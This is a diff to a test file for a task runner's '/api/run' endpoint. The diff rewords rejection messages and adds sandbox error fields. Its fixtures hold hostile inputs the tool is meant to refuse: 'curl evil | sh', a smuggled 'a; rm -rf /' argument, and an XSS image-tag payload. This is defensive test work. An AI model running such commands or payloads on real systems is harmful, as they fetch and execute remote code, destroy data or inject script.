@@ -24,7 +24,7 @@ const answers = {
     tasks: [npmTest,
       { ...npmTest, name: 'sneaky', argv: ['sh', '-c', 'curl evil | sh'] },
       { ...npmTest, name: 'a; rm -rf /', argv: [...NPM, 'run', '--', 'a; rm -rf /'] },
-      { source: 'npm', name: '<img src=x onerror=alert(1)>', error: 'not a name the Run menu passes on' },
+      { source: 'npm', name: '<img src=x onerror=alert(1)>', error: 'not a name the Run menu passes on (letters, digits and _ . / + -): run it in the terminal' },   // (bn-coded's own words: plainly)
       { source: 'make', name: 'check', argv: ['/usr/bin/make', '--', 'check'], cwd: '.', command: 'make -- check', detail: [{ name: 'Makefile: check', text: 'pytest -q' }],
         files: [{ path: 'Makefile', sha256: 'f'.repeat(64) }], notes: [7, 'Makefile includes other files'] },
       { source: 'python', name: 'hello', argv: ['/usr/bin/python3.13', '-I', '-c', PY_LOADER, 'hello', 'app.cli:main'], cwd: '.', command: 'python3 -c …', detail: [{ name: 'pyproject.toml', text: 'hello = "app.cli:main"' }] },
@@ -65,14 +65,14 @@ test('GET /api/run: tasks whole (the fixed wrapper, the texts shown, the files b
   const r = await req('GET', '/api/run');
   assert.equal(r.status, 200);
   assert.deepEqual(r.json.sources, [{ source: 'npm', file: 'package.json', exists: true, error: null, more: true },
-    { source: 'make', file: 'Makefile', exists: true, error: 'x [31m', more: false }]);
+    { source: 'make', file: 'Makefile', exists: true, error: 'the sandbox gave a reason of its own', said: 'x [31m', saidBy: 'sandbox', more: false }]);
   const { digest, ...shown } = npmTest;
   const want = { ...shown, digest: runDigest(shown) };
   assert.deepEqual(r.json.tasks[0], want);
   assert.notEqual(r.json.tasks[0].digest, digest);
   assert.deepEqual(r.json.tasks.slice(1).map((t) => [t.name, t.error ?? t.digest.length]), [
     ['sneaky', 'not run the way bedrock-now runs tasks: run it in the terminal'],
-    ['<img src=x onerror=alert(1)>', 'not a name the Run menu passes on'],
+    ['<img src=x onerror=alert(1)>', 'not a name the Run menu passes on (letters, digits and _ . / + -): run it in the terminal'],
     ['check', 64], ['hello', 64],
     ['evil', 'not run the way bedrock-now runs tasks: run it in the terminal'],
     ['far', 'not run in the workspace\'s top folder: run it in the terminal']]);
